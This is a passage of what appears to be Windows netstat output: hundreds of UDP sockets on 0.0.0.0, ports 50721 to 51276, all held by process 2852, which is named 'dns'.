  UDP        0.0.0.0               50721         *:*                            2852              dns
  UDP        0.0.0.0               50722         *:*                            2852              dns
  UDP        0.0.0.0               50723         *:*                            2852              dns
  UDP        0.0.0.0               50724         *:*                            2852              dns
  UDP        0.0.0.0               50725         *:*                            2852              dns
  UDP        0.0.0.0               50726         *:*                            2852              dns
  UDP        0.0.0.0               50727         *:*                            2852              dns
  UDP        0.0.0.0               50728         *:*                            2852              dns
  UDP        0.0.0.0               50729         *:*                            2852              dns
  UDP        0.0.0.0               50730         *:*                            2852              dns
  UDP        0.0.0.0               50731         *:*                            2852              dns
  UDP        0.0.0.0               50732         *:*                            2852              dns
  UDP        0.0.0.0               50733         *:*                            2852              dns
  UDP        0.0.0.0               50734         *:*                            2852              dns
  UDP        0.0.0.0               50735         *:*                            2852              dns
  UDP        0.0.0.0               50736         *:*                            2852              dns
  UDP        0.0.0.0               50737         *:*                            2852              dns
  UDP        0.0.0.0               50738         *:*                            2852              dns
  UDP        0.0.0.0               50739         *:*                            2852              dns
  UDP        0.0.0.0               50740         *:*                            2852              dns
  UDP        0.0.0.0               50741         *:*                            2852              dns
  UDP        0.0.0.0               50742         *:*                            2852              dns
  UDP        0.0.0.0               50743         *:*                            2852              dns
  UDP        0.0.0.0               50744         *:*                            2852              dns
  UDP        0.0.0.0               50745         *:*                            2852              dns
  UDP        0.0.0.0               50746         *:*                            2852              dns
  UDP        0.0.0.0               50747         *:*                            2852              dns
  UDP        0.0.0.0               50748         *:*                            2852              dns
  UDP        0.0.0.0               50749         *:*                            2852              dns
  UDP        0.0.0.0               50750         *:*                            2852              dns
  UDP        0.0.0.0               50751         *:*                            2852              dns
  UDP        0.0.0.0               50752         *:*                            2852              dns
  UDP        0.0.0.0               50753         *:*                            2852              dns
  UDP        0.0.0.0               50754         *:*                            2852              dns
  UDP        0.0.0.0               50755         *:*                            2852              dns
  UDP        0.0.0.0               50756         *:*                            2852              dns
  UDP        0.0.0.0               50757         *:*                            2852              dns
  UDP        0.0.0.0               50758         *:*                            2852              dns
  UDP        0.0.0.0               50759         *:*                            2852              dns
  UDP        0.0.0.0               50760         *:*                            2852              dns
  UDP        0.0.0.0               50761         *:*                            2852              dns
  UDP        0.0.0.0               50762         *:*                            2852              dns
  UDP        0.0.0.0               50763         *:*                            2852              dns
  UDP        0.0.0.0               50764         *:*                            2852              dns
  UDP        0.0.0.0               50765         *:*                            2852              dns
  UDP        0.0.0.0               50766         *:*                            2852              dns
  UDP        0.0.0.0               50767         *:*                            2852              dns
  UDP        0.0.0.0               50768         *:*                            2852              dns
  UDP        0.0.0.0               50769         *:*                            2852              dns
  UDP        0.0.0.0               50770         *:*                            2852              dns
  UDP        0.0.0.0               50771         *:*                            2852              dns
  UDP        0.0.0.0               50772         *:*                            2852              dns
  UDP        0.0.0.0               50773         *:*                            2852              dns
  UDP        0.0.0.0               50774         *:*                            2852              dns
  UDP        0.0.0.0               50775         *:*                            2852              dns
  UDP        0.0.0.0               50776         *:*                            2852              dns
  UDP        0.0.0.0               50777         *:*                            2852              dns
  UDP        0.0.0.0               50778         *:*                            2852              dns
  UDP        0.0.0.0               50779         *:*                            2852              dns
  UDP        0.0.0.0               50780         *:*                            2852              dns
  UDP        0.0.0.0               50781         *:*                            2852              dns
  UDP        0.0.0.0               50782         *:*                            2852              dns
  UDP        0.0.0.0               50783         *:*                            2852              dns
  UDP        0.0.0.0               50784         *:*                            2852              dns
  UDP        0.0.0.0               50785         *:*                            2852              dns
  UDP        0.0.0.0               50786         *:*                            2852              dns
  UDP        0.0.0.0               50787         *:*                            2852              dns
  UDP        0.0.0.0               50788         *:*                            2852              dns
  UDP        0.0.0.0               50789         *:*                            2852              dns
  UDP        0.0.0.0               50790         *:*                            2852              dns
  UDP        0.0.0.0               50791         *:*                            2852              dns
  UDP        0.0.0.0               50792         *:*                            2852              dns
  UDP        0.0.0.0               50793         *:*                            2852              dns
  UDP        0.0.0.0               50794         *:*                            2852              dns
  UDP        0.0.0.0               50795         *:*                            2852              dns
  UDP        0.0.0.0               50796         *:*                            2852              dns
  UDP        0.0.0.0               50797         *:*                            2852              dns
  UDP        0.0.0.0               50798         *:*                            2852              dns
  UDP        0.0.0.0               50799         *:*                            2852              dns
  UDP        0.0.0.0               50800         *:*                            2852              dns
  UDP        0.0.0.0               50801         *:*                            2852              dns
  UDP        0.0.0.0               50802         *:*                            2852              dns
  UDP        0.0.0.0               50803         *:*                            2852              dns
  UDP        0.0.0.0               50804         *:*                            2852              dns
  UDP        0.0.0.0               50805         *:*                            2852              dns
  UDP        0.0.0.0               50806         *:*                            2852              dns
  UDP        0.0.0.0               50807         *:*                            2852              dns
  UDP        0.0.0.0               50808         *:*                            2852              dns
  UDP        0.0.0.0               50809         *:*                            2852              dns
  UDP        0.0.0.0               50810         *:*                            2852              dns
  UDP        0.0.0.0               50811         *:*                            2852              dns
  UDP        0.0.0.0               50812         *:*                            2852              dns
  UDP        0.0.0.0               50813         *:*                            2852              dns
  UDP        0.0.0.0               50814         *:*                            2852              dns
  UDP        0.0.0.0               50815         *:*                            2852              dns
  UDP        0.0.0.0               50816         *:*                            2852              dns
  UDP        0.0.0.0               50817         *:*                            2852              dns
  UDP        0.0.0.0               50818         *:*                            2852              dns
  UDP        0.0.0.0               50819         *:*                            2852              dns
  UDP        0.0.0.0               50820         *:*                            2852              dns
  UDP        0.0.0.0               50821         *:*                            2852              dns
  UDP        0.0.0.0               50822         *:*                            2852              dns
  UDP        0.0.0.0               50823         *:*                            2852              dns
  UDP        0.0.0.0               50824         *:*                            2852              dns
  UDP        0.0.0.0               50825         *:*                            2852              dns
  UDP        0.0.0.0               50826         *:*                            2852              dns
  UDP        0.0.0.0               50827         *:*                            2852              dns
  UDP        0.0.0.0               50828         *:*                            2852              dns
  UDP        0.0.0.0               50829         *:*                            2852              dns
  UDP        0.0.0.0               50830         *:*                            2852              dns
  UDP        0.0.0.0               50831         *:*                            2852              dns
  UDP        0.0.0.0               50832         *:*                            2852              dns
  UDP        0.0.0.0               50833         *:*                            2852              dns
  UDP        0.0.0.0               50834         *:*                            2852              dns
  UDP        0.0.0.0               50835         *:*                            2852              dns
  UDP        0.0.0.0               50836         *:*                            2852              dns
  UDP        0.0.0.0               50837         *:*                            2852              dns
  UDP        0.0.0.0               50838         *:*                            2852              dns
  UDP        0.0.0.0               50839         *:*                            2852              dns
  UDP        0.0.0.0               50840         *:*                            2852              dns
  UDP        0.0.0.0               50841         *:*                            2852              dns
  UDP        0.0.0.0               50842         *:*                            2852              dns
  UDP        0.0.0.0               50843         *:*                            2852              dns
  UDP        0.0.0.0               50844         *:*                            2852              dns
  UDP        0.0.0.0               50845         *:*                            2852              dns
  UDP        0.0.0.0               50846         *:*                            2852              dns
  UDP        0.0.0.0               50847         *:*                            2852              dns
  UDP        0.0.0.0               50848         *:*                            2852              dns
  UDP        0.0.0.0               50849         *:*                            2852              dns
  UDP        0.0.0.0               50850         *:*                            2852              dns
  UDP        0.0.0.0               50851         *:*                            2852              dns
  UDP        0.0.0.0               50852         *:*                            2852              dns
  UDP        0.0.0.0               50853         *:*                            2852              dns
  UDP        0.0.0.0               50854         *:*                            2852              dns
  UDP        0.0.0.0               50855         *:*                            2852              dns
  UDP        0.0.0.0               50856         *:*                            2852              dns
  UDP        0.0.0.0               50857         *:*                            2852              dns
  UDP        0.0.0.0               50859         *:*                            2852              dns
  UDP        0.0.0.0               50860         *:*                            2852              dns
  UDP        0.0.0.0               50861         *:*                            2852              dns
  UDP        0.0.0.0               50862         *:*                            2852              dns
  UDP        0.0.0.0               50863         *:*                            2852              dns
  UDP        0.0.0.0               50864         *:*                            2852              dns
  UDP        0.0.0.0               50865         *:*                            2852              dns
  UDP        0.0.0.0               50866         *:*                            2852              dns
  UDP        0.0.0.0               50867         *:*                            2852              dns
  UDP        0.0.0.0               50868         *:*                            2852              dns
  UDP        0.0.0.0               50869         *:*                            2852              dns
  UDP        0.0.0.0               50870         *:*                            2852              dns
  UDP        0.0.0.0               50871         *:*                            2852              dns
  UDP        0.0.0.0               50872         *:*                            2852              dns
  UDP        0.0.0.0               50873         *:*                            2852              dns
  UDP        0.0.0.0               50874         *:*                            2852              dns
  UDP        0.0.0.0               50875         *:*                            2852              dns
  UDP        0.0.0.0               50876         *:*                            2852              dns
  UDP        0.0.0.0               50877         *:*                            2852              dns
  UDP        0.0.0.0               50878         *:*                            2852              dns
  UDP        0.0.0.0               50879         *:*                            2852              dns
  UDP        0.0.0.0               50880         *:*                            2852              dns
  UDP        0.0.0.0               50881         *:*                            2852              dns
  UDP        0.0.0.0               50882         *:*                            2852              dns
  UDP        0.0.0.0               50883         *:*                            2852              dns
  UDP        0.0.0.0               50884         *:*                            2852              dns
  UDP        0.0.0.0               50885         *:*                            2852              dns
  UDP        0.0.0.0               50886         *:*                            2852              dns
  UDP        0.0.0.0               50887         *:*                            2852              dns
  UDP        0.0.0.0               50888         *:*                            2852              dns
  UDP        0.0.0.0               50889         *:*                            2852              dns
  UDP        0.0.0.0               50890         *:*                            2852              dns
  UDP        0.0.0.0               50891         *:*                            2852              dns
  UDP        0.0.0.0               50892         *:*                            2852              dns
  UDP        0.0.0.0               50893         *:*                            2852              dns
  UDP        0.0.0.0               50894         *:*                            2852              dns
  UDP        0.0.0.0               50895         *:*                            2852              dns
  UDP        0.0.0.0               50896         *:*                            2852              dns
  UDP        0.0.0.0               50897         *:*                            2852              dns
  UDP        0.0.0.0               50898         *:*                            2852              dns
  UDP        0.0.0.0               50899         *:*                            2852              dns
  UDP        0.0.0.0               50900         *:*                            2852              dns
  UDP        0.0.0.0               50901         *:*                            2852              dns
  UDP        0.0.0.0               50902         *:*                            2852              dns
  UDP        0.0.0.0               50903         *:*                            2852              dns
  UDP        0.0.0.0               50904         *:*                            2852              dns
  UDP        0.0.0.0               50905         *:*                            2852              dns
  UDP        0.0.0.0               50906         *:*                            2852              dns
  UDP        0.0.0.0               50907         *:*                            2852              dns
  UDP        0.0.0.0               50908         *:*                            2852              dns
  UDP        0.0.0.0               50909         *:*                            2852              dns
  UDP        0.0.0.0               50910         *:*                            2852              dns
  UDP        0.0.0.0               50911         *:*                            2852              dns
  UDP        0.0.0.0               50912         *:*                            2852              dns
  UDP        0.0.0.0               50913         *:*                            2852              dns
  UDP        0.0.0.0               50914         *:*                            2852              dns
  UDP        0.0.0.0               50915         *:*                            2852              dns
  UDP        0.0.0.0               50916         *:*                            2852              dns
  UDP        0.0.0.0               50917         *:*                            2852              dns
  UDP        0.0.0.0               50918         *:*                            2852              dns
  UDP        0.0.0.0               50919         *:*                            2852              dns
  UDP        0.0.0.0               50920         *:*                            2852              dns
  UDP        0.0.0.0               50921         *:*                            2852              dns
  UDP        0.0.0.0               50922         *:*                            2852              dns
  UDP        0.0.0.0               50923         *:*                            2852              dns
  UDP        0.0.0.0               50924         *:*                            2852              dns
  UDP        0.0.0.0               50925         *:*                            2852              dns
  UDP        0.0.0.0               50926         *:*                            2852              dns
  UDP        0.0.0.0               50927         *:*                            2852              dns
  UDP        0.0.0.0               50928         *:*                            2852              dns
  UDP        0.0.0.0               50929         *:*                            2852              dns
  UDP        0.0.0.0               50930         *:*                            2852              dns
  UDP        0.0.0.0               50931         *:*                            2852              dns
  UDP        0.0.0.0               50932         *:*                            2852              dns
  UDP        0.0.0.0               50933         *:*                            2852              dns
  UDP        0.0.0.0               50934         *:*                            2852              dns
  UDP        0.0.0.0               50935         *:*                            2852              dns
  UDP        0.0.0.0               50936         *:*                            2852              dns
  UDP        0.0.0.0               50937         *:*                            2852              dns
  UDP        0.0.0.0               50938         *:*                            2852              dns
  UDP        0.0.0.0               50939         *:*                            2852              dns
  UDP        0.0.0.0               50940         *:*                            2852              dns
  UDP        0.0.0.0               50941         *:*                            2852              dns
  UDP        0.0.0.0               50942         *:*                            2852              dns
  UDP        0.0.0.0               50943         *:*                            2852              dns
  UDP        0.0.0.0               50944         *:*                            2852              dns
  UDP        0.0.0.0               50945         *:*                            2852              dns
  UDP        0.0.0.0               50946         *:*                            2852              dns
  UDP        0.0.0.0               50947         *:*                            2852              dns
  UDP        0.0.0.0               50948         *:*                            2852              dns
  UDP        0.0.0.0               50949         *:*                            2852              dns
  UDP        0.0.0.0               50950         *:*                            2852              dns
  UDP        0.0.0.0               50951         *:*                            2852              dns
  UDP        0.0.0.0               50952         *:*                            2852              dns
  UDP        0.0.0.0               50953         *:*                            2852              dns
  UDP        0.0.0.0               50954         *:*                            2852              dns
  UDP        0.0.0.0               50955         *:*                            2852              dns
  UDP        0.0.0.0               50956         *:*                            2852              dns
  UDP        0.0.0.0               50957         *:*                            2852              dns
  UDP        0.0.0.0               50958         *:*                            2852              dns
  UDP        0.0.0.0               50959         *:*                            2852              dns
  UDP        0.0.0.0               50960         *:*                            2852              dns
  UDP        0.0.0.0               50961         *:*                            2852              dns
  UDP        0.0.0.0               50962         *:*                            2852              dns
  UDP        0.0.0.0               50963         *:*                            2852              dns
  UDP        0.0.0.0               50964         *:*                            2852              dns
  UDP        0.0.0.0               50965         *:*                            2852              dns
  UDP        0.0.0.0               50966         *:*                            2852              dns
  UDP        0.0.0.0               50967         *:*                            2852              dns
  UDP        0.0.0.0               50968         *:*                            2852              dns
  UDP        0.0.0.0               50969         *:*                            2852              dns
  UDP        0.0.0.0               50970         *:*                            2852              dns
  UDP        0.0.0.0               50971         *:*                            2852              dns
  UDP        0.0.0.0               50972         *:*                            2852              dns
  UDP        0.0.0.0               50973         *:*                            2852              dns
  UDP        0.0.0.0               50974         *:*                            2852              dns
  UDP        0.0.0.0               50975         *:*                            2852              dns
  UDP        0.0.0.0               50976         *:*                            2852              dns
  UDP        0.0.0.0               50977         *:*                            2852              dns
  UDP        0.0.0.0               50978         *:*                            2852              dns
  UDP        0.0.0.0               50979         *:*                            2852              dns
  UDP        0.0.0.0               50980         *:*                            2852              dns
  UDP        0.0.0.0               50981         *:*                            2852              dns
  UDP        0.0.0.0               50982         *:*                            2852              dns
  UDP        0.0.0.0               50983         *:*                            2852              dns
  UDP        0.0.0.0               50984         *:*                            2852              dns
  UDP        0.0.0.0               50985         *:*                            2852              dns
  UDP        0.0.0.0               50986         *:*                            2852              dns
  UDP        0.0.0.0               50987         *:*                            2852              dns
  UDP        0.0.0.0               50988         *:*                            2852              dns
  UDP        0.0.0.0               50989         *:*                            2852              dns
  UDP        0.0.0.0               50990         *:*                            2852              dns
  UDP        0.0.0.0               50991         *:*                            2852              dns
  UDP        0.0.0.0               50992         *:*                            2852              dns
  UDP        0.0.0.0               50993         *:*                            2852              dns
  UDP        0.0.0.0               50994         *:*                            2852              dns
  UDP        0.0.0.0               50995         *:*                            2852              dns
  UDP        0.0.0.0               50996         *:*                            2852              dns
  UDP        0.0.0.0               50997         *:*                            2852              dns
  UDP        0.0.0.0               50998         *:*                            2852              dns
  UDP        0.0.0.0               50999         *:*                            2852              dns
  UDP        0.0.0.0               51000         *:*                            2852              dns
  UDP        0.0.0.0               51001         *:*                            2852              dns
  UDP        0.0.0.0               51002         *:*                            2852              dns
  UDP        0.0.0.0               51003         *:*                            2852              dns
  UDP        0.0.0.0               51004         *:*                            2852              dns
  UDP        0.0.0.0               51005         *:*                            2852              dns
  UDP        0.0.0.0               51006         *:*                            2852              dns
  UDP        0.0.0.0               51007         *:*                            2852              dns
  UDP        0.0.0.0               51008         *:*                            2852              dns
  UDP        0.0.0.0               51009         *:*                            2852              dns
  UDP        0.0.0.0               51010         *:*                            2852              dns
  UDP        0.0.0.0               51011         *:*                            2852              dns
  UDP        0.0.0.0               51012         *:*                            2852              dns
  UDP        0.0.0.0               51013         *:*                            2852              dns
  UDP        0.0.0.0               51014         *:*                            2852              dns
  UDP        0.0.0.0               51015         *:*                            2852              dns
  UDP        0.0.0.0               51016         *:*                            2852              dns
  UDP        0.0.0.0               51017         *:*                            2852              dns
  UDP        0.0.0.0               51018         *:*                            2852              dns
  UDP        0.0.0.0               51019         *:*                            2852              dns
  UDP        0.0.0.0               51020         *:*                            2852              dns
  UDP        0.0.0.0               51021         *:*                            2852              dns
  UDP        0.0.0.0               51022         *:*                            2852              dns
  UDP        0.0.0.0               51023         *:*                            2852              dns
  UDP        0.0.0.0               51024         *:*                            2852              dns
  UDP        0.0.0.0               51025         *:*                            2852              dns
  UDP        0.0.0.0               51026         *:*                            2852              dns
  UDP        0.0.0.0               51027         *:*                            2852              dns
  UDP        0.0.0.0               51028         *:*                            2852              dns
  UDP        0.0.0.0               51029         *:*                            2852              dns
  UDP        0.0.0.0               51030         *:*                            2852              dns
  UDP        0.0.0.0               51031         *:*                            2852              dns
  UDP        0.0.0.0               51032         *:*                            2852              dns
  UDP        0.0.0.0               51033         *:*                            2852              dns
  UDP        0.0.0.0               51034         *:*                            2852              dns
  UDP        0.0.0.0               51035         *:*                            2852              dns
  UDP        0.0.0.0               51036         *:*                            2852              dns
  UDP        0.0.0.0               51037         *:*                            2852              dns
  UDP        0.0.0.0               51038         *:*                            2852              dns
  UDP        0.0.0.0               51039         *:*                            2852              dns
  UDP        0.0.0.0               51040         *:*                            2852              dns
  UDP        0.0.0.0               51041         *:*                            2852              dns
  UDP        0.0.0.0               51042         *:*                            2852              dns
  UDP        0.0.0.0               51043         *:*                            2852              dns
  UDP        0.0.0.0               51044         *:*                            2852              dns
  UDP        0.0.0.0               51045         *:*                            2852              dns
  UDP        0.0.0.0               51046         *:*                            2852              dns
  UDP        0.0.0.0               51047         *:*                            2852              dns
  UDP        0.0.0.0               51048         *:*                            2852              dns
  UDP        0.0.0.0               51049         *:*                            2852              dns
  UDP        0.0.0.0               51050         *:*                            2852              dns
  UDP        0.0.0.0               51051         *:*                            2852              dns
  UDP        0.0.0.0               51052         *:*                            2852              dns
  UDP        0.0.0.0               51053         *:*                            2852              dns
  UDP        0.0.0.0               51054         *:*                            2852              dns
  UDP        0.0.0.0               51055         *:*                            2852              dns
  UDP        0.0.0.0               51056         *:*                            2852              dns
  UDP        0.0.0.0               51057         *:*                            2852              dns
  UDP        0.0.0.0               51058         *:*                            2852              dns
  UDP        0.0.0.0               51059         *:*                            2852              dns
  UDP        0.0.0.0               51060         *:*                            2852              dns
  UDP        0.0.0.0               51061         *:*                            2852              dns
  UDP        0.0.0.0               51062         *:*                            2852              dns
  UDP        0.0.0.0               51063         *:*                            2852              dns
  UDP        0.0.0.0               51064         *:*                            2852              dns
  UDP        0.0.0.0               51065         *:*                            2852              dns
  UDP        0.0.0.0               51066         *:*                            2852              dns
  UDP        0.0.0.0               51067         *:*                            2852              dns
  UDP        0.0.0.0               51068         *:*                            2852              dns
  UDP        0.0.0.0               51069         *:*                            2852              dns
  UDP        0.0.0.0               51070         *:*                            2852              dns
  UDP        0.0.0.0               51071         *:*                            2852              dns
  UDP        0.0.0.0               51072         *:*                            2852              dns
  UDP        0.0.0.0               51073         *:*                            2852              dns
  UDP        0.0.0.0               51074         *:*                            2852              dns
  UDP        0.0.0.0               51075         *:*                            2852              dns
  UDP        0.0.0.0               51076         *:*                            2852              dns
  UDP        0.0.0.0               51077         *:*                            2852              dns
  UDP        0.0.0.0               51078         *:*                            2852              dns
  UDP        0.0.0.0               51079         *:*                            2852              dns
  UDP        0.0.0.0               51080         *:*                            2852              dns
  UDP        0.0.0.0               51081         *:*                            2852              dns
  UDP        0.0.0.0               51082         *:*                            2852              dns
  UDP        0.0.0.0               51083         *:*                            2852              dns
  UDP        0.0.0.0               51084         *:*                            2852              dns
  UDP        0.0.0.0               51085         *:*                            2852              dns
  UDP        0.0.0.0               51086         *:*                            2852              dns
  UDP        0.0.0.0               51087         *:*                            2852              dns
  UDP        0.0.0.0               51088         *:*                            2852              dns
  UDP        0.0.0.0               51089         *:*                            2852              dns
  UDP        0.0.0.0               51090         *:*                            2852              dns
  UDP        0.0.0.0               51091         *:*                            2852              dns
  UDP        0.0.0.0               51092         *:*                            2852              dns
  UDP        0.0.0.0               51093         *:*                            2852              dns
  UDP        0.0.0.0               51094         *:*                            2852              dns
  UDP        0.0.0.0               51095         *:*                            2852              dns
  UDP        0.0.0.0               51096         *:*                            2852              dns
  UDP        0.0.0.0               51097         *:*                            2852              dns
  UDP        0.0.0.0               51098         *:*                            2852              dns
  UDP        0.0.0.0               51099         *:*                            2852              dns
  UDP        0.0.0.0               51100         *:*                            2852              dns
  UDP        0.0.0.0               51101         *:*                            2852              dns
  UDP        0.0.0.0               51102         *:*                            2852              dns
  UDP        0.0.0.0               51103         *:*                            2852              dns
  UDP        0.0.0.0               51104         *:*                            2852              dns
  UDP        0.0.0.0               51105         *:*                            2852              dns
  UDP        0.0.0.0               51106         *:*                            2852              dns
  UDP        0.0.0.0               51107         *:*                            2852              dns
  UDP        0.0.0.0               51108         *:*                            2852              dns
  UDP        0.0.0.0               51109         *:*                            2852              dns
  UDP        0.0.0.0               51110         *:*                            2852              dns
  UDP        0.0.0.0               51111         *:*                            2852              dns
  UDP        0.0.0.0               51112         *:*                            2852              dns
  UDP        0.0.0.0               51113         *:*                            2852              dns
  UDP        0.0.0.0               51114         *:*                            2852              dns
  UDP        0.0.0.0               51115         *:*                            2852              dns
  UDP        0.0.0.0               51116         *:*                            2852              dns
  UDP        0.0.0.0               51117         *:*                            2852              dns
  UDP        0.0.0.0               51118         *:*                            2852              dns
  UDP        0.0.0.0               51119         *:*                            2852              dns
  UDP        0.0.0.0               51120         *:*                            2852              dns
  UDP        0.0.0.0               51121         *:*                            2852              dns
  UDP        0.0.0.0               51122         *:*                            2852              dns
  UDP        0.0.0.0               51123         *:*                            2852              dns
  UDP        0.0.0.0               51124         *:*                            2852              dns
  UDP        0.0.0.0               51125         *:*                            2852              dns
  UDP        0.0.0.0               51126         *:*                            2852              dns
  UDP        0.0.0.0               51127         *:*                            2852              dns
  UDP        0.0.0.0               51128         *:*                            2852              dns
  UDP        0.0.0.0               51129         *:*                            2852              dns
  UDP        0.0.0.0               51130         *:*                            2852              dns
  UDP        0.0.0.0               51131         *:*                            2852              dns
  UDP        0.0.0.0               51132         *:*                            2852              dns
  UDP        0.0.0.0               51133         *:*                            2852              dns
  UDP        0.0.0.0               51134         *:*                            2852              dns
  UDP        0.0.0.0               51135         *:*                            2852              dns
  UDP        0.0.0.0               51136         *:*                            2852              dns
  UDP        0.0.0.0               51137         *:*                            2852              dns
  UDP        0.0.0.0               51138         *:*                            2852              dns
  UDP        0.0.0.0               51139         *:*                            2852              dns
  UDP        0.0.0.0               51140         *:*                            2852              dns
  UDP        0.0.0.0               51141         *:*                            2852              dns
  UDP        0.0.0.0               51142         *:*                            2852              dns
  UDP        0.0.0.0               51143         *:*                            2852              dns
  UDP        0.0.0.0               51144         *:*                            2852              dns
  UDP        0.0.0.0               51145         *:*                            2852              dns
  UDP        0.0.0.0               51146         *:*                            2852              dns
  UDP        0.0.0.0               51147         *:*                            2852              dns
  UDP        0.0.0.0               51148         *:*                            2852              dns
  UDP        0.0.0.0               51149         *:*                            2852              dns
  UDP        0.0.0.0               51150         *:*                            2852              dns
  UDP        0.0.0.0               51151         *:*                            2852              dns
  UDP        0.0.0.0               51152         *:*                            2852              dns
  UDP        0.0.0.0               51153         *:*                            2852              dns
  UDP        0.0.0.0               51154         *:*                            2852              dns
  UDP        0.0.0.0               51155         *:*                            2852              dns
  UDP        0.0.0.0               51156         *:*                            2852              dns
  UDP        0.0.0.0               51157         *:*                            2852              dns
  UDP        0.0.0.0               51158         *:*                            2852              dns
  UDP        0.0.0.0               51159         *:*                            2852              dns
  UDP        0.0.0.0               51160         *:*                            2852              dns
  UDP        0.0.0.0               51161         *:*                            2852              dns
  UDP        0.0.0.0               51162         *:*                            2852              dns
  UDP        0.0.0.0               51163         *:*                            2852              dns
  UDP        0.0.0.0               51164         *:*                            2852              dns
  UDP        0.0.0.0               51165         *:*                            2852              dns
  UDP        0.0.0.0               51166         *:*                            2852              dns
  UDP        0.0.0.0               51167         *:*                            2852              dns
  UDP        0.0.0.0               51168         *:*                            2852              dns
  UDP        0.0.0.0               51169         *:*                            2852              dns
  UDP        0.0.0.0               51170         *:*                            2852              dns
  UDP        0.0.0.0               51171         *:*                            2852              dns
  UDP        0.0.0.0               51172         *:*                            2852              dns
  UDP        0.0.0.0               51173         *:*                            2852              dns
  UDP        0.0.0.0               51174         *:*                            2852              dns
  UDP        0.0.0.0               51175         *:*                            2852              dns
  UDP        0.0.0.0               51176         *:*                            2852              dns
  UDP        0.0.0.0               51177         *:*                            2852              dns
  UDP        0.0.0.0               51178         *:*                            2852              dns
  UDP        0.0.0.0               51179         *:*                            2852              dns
  UDP        0.0.0.0               51180         *:*                            2852              dns
  UDP        0.0.0.0               51181         *:*                            2852              dns
  UDP        0.0.0.0               51182         *:*                            2852              dns
  UDP        0.0.0.0               51183         *:*                            2852              dns
  UDP        0.0.0.0               51184         *:*                            2852              dns
  UDP        0.0.0.0               51185         *:*                            2852              dns
  UDP        0.0.0.0               51186         *:*                            2852              dns
  UDP        0.0.0.0               51187         *:*                            2852              dns
  UDP        0.0.0.0               51188         *:*                            2852              dns
  UDP        0.0.0.0               51189         *:*                            2852              dns
  UDP        0.0.0.0               51190         *:*                            2852              dns
  UDP        0.0.0.0               51191         *:*                            2852              dns
  UDP        0.0.0.0               51192         *:*                            2852              dns
  UDP        0.0.0.0               51193         *:*                            2852              dns
  UDP        0.0.0.0               51194         *:*                            2852              dns
  UDP        0.0.0.0               51195         *:*                            2852              dns
  UDP        0.0.0.0               51196         *:*                            2852              dns
  UDP        0.0.0.0               51197         *:*                            2852              dns
  UDP        0.0.0.0               51198         *:*                            2852              dns
  UDP        0.0.0.0               51199         *:*                            2852              dns
  UDP        0.0.0.0               51200         *:*                            2852              dns
  UDP        0.0.0.0               51201         *:*                            2852              dns
  UDP        0.0.0.0               51202         *:*                            2852              dns
  UDP        0.0.0.0               51203         *:*                            2852              dns
  UDP        0.0.0.0               51204         *:*                            2852              dns
  UDP        0.0.0.0               51205         *:*                            2852              dns
  UDP        0.0.0.0               51206         *:*                            2852              dns
  UDP        0.0.0.0               51207         *:*                            2852              dns
  UDP        0.0.0.0               51208         *:*                            2852              dns
  UDP        0.0.0.0               51209         *:*                            2852              dns
  UDP        0.0.0.0               51210         *:*                            2852              dns
  UDP        0.0.0.0               51211         *:*                            2852              dns
  UDP        0.0.0.0               51212         *:*                            2852              dns
  UDP        0.0.0.0               51213         *:*                            2852              dns
  UDP        0.0.0.0               51214         *:*                            2852              dns
  UDP        0.0.0.0               51215         *:*                            2852              dns
  UDP        0.0.0.0               51216         *:*                            2852              dns
  UDP        0.0.0.0               51217         *:*                            2852              dns
  UDP        0.0.0.0               51218         *:*                            2852              dns
  UDP        0.0.0.0               51219         *:*                            2852              dns
  UDP        0.0.0.0               51220         *:*                            2852              dns
  UDP        0.0.0.0               51221         *:*                            2852              dns
  UDP        0.0.0.0               51222         *:*                            2852              dns
  UDP        0.0.0.0               51223         *:*                            2852              dns
  UDP        0.0.0.0               51224         *:*                            2852              dns
  UDP        0.0.0.0               51225         *:*                            2852              dns
  UDP        0.0.0.0               51226         *:*                            2852              dns
  UDP        0.0.0.0               51227         *:*                            2852              dns
  UDP        0.0.0.0               51228         *:*                            2852              dns
  UDP        0.0.0.0               51229         *:*                            2852              dns
  UDP        0.0.0.0               51230         *:*                            2852              dns
  UDP        0.0.0.0               51231         *:*                            2852              dns
  UDP        0.0.0.0               51232         *:*                            2852              dns
  UDP        0.0.0.0               51233         *:*                            2852              dns
  UDP        0.0.0.0               51234         *:*                            2852              dns
  UDP        0.0.0.0               51235         *:*                            2852              dns
  UDP        0.0.0.0               51236         *:*                            2852              dns
  UDP        0.0.0.0               51237         *:*                            2852              dns
  UDP        0.0.0.0               51238         *:*                            2852              dns
  UDP        0.0.0.0               51239         *:*                            2852              dns
  UDP        0.0.0.0               51240         *:*                            2852              dns
  UDP        0.0.0.0               51241         *:*                            2852              dns
  UDP        0.0.0.0               51242         *:*                            2852              dns
  UDP        0.0.0.0               51243         *:*                            2852              dns
  UDP        0.0.0.0               51244         *:*                            2852              dns
  UDP        0.0.0.0               51245         *:*                            2852              dns
  UDP        0.0.0.0               51246         *:*                            2852              dns
  UDP        0.0.0.0               51247         *:*                            2852              dns
  UDP        0.0.0.0               51248         *:*                            2852              dns
  UDP        0.0.0.0               51249         *:*                            2852              dns
  UDP        0.0.0.0               51250         *:*                            2852              dns
  UDP        0.0.0.0               51251         *:*                            2852              dns
  UDP        0.0.0.0               51252         *:*                            2852              dns
  UDP        0.0.0.0               51253         *:*                            2852              dns
  UDP        0.0.0.0               51254         *:*                            2852              dns
  UDP        0.0.0.0               51255         *:*                            2852              dns
  UDP        0.0.0.0               51256         *:*                            2852              dns
  UDP        0.0.0.0               51257         *:*                            2852              dns
  UDP        0.0.0.0               51258         *:*                            2852              dns
  UDP        0.0.0.0               51259         *:*                            2852              dns
  UDP        0.0.0.0               51260         *:*                            2852              dns
  UDP        0.0.0.0               51261         *:*                            2852              dns
  UDP        0.0.0.0               51262         *:*                            2852              dns
  UDP        0.0.0.0               51263         *:*                            2852              dns
  UDP        0.0.0.0               51264         *:*                            2852              dns
  UDP        0.0.0.0               51265         *:*                            2852              dns
  UDP        0.0.0.0               51266         *:*                            2852              dns
  UDP        0.0.0.0               51267         *:*                            2852              dns
  UDP        0.0.0.0               51268         *:*                            2852              dns
  UDP        0.0.0.0               51269         *:*                            2852              dns
  UDP        0.0.0.0               51270         *:*                            2852              dns
  UDP        0.0.0.0               51271         *:*                            2852              dns
  UDP        0.0.0.0               51272         *:*                            2852              dns
  UDP        0.0.0.0               51273         *:*                            2852              dns
  UDP        0.0.0.0               51274         *:*                            2852              dns
  UDP        0.0.0.0               51275         *:*                            2852              dns
  UDP        0.0.0.0               51276         *:*                            2852              dns
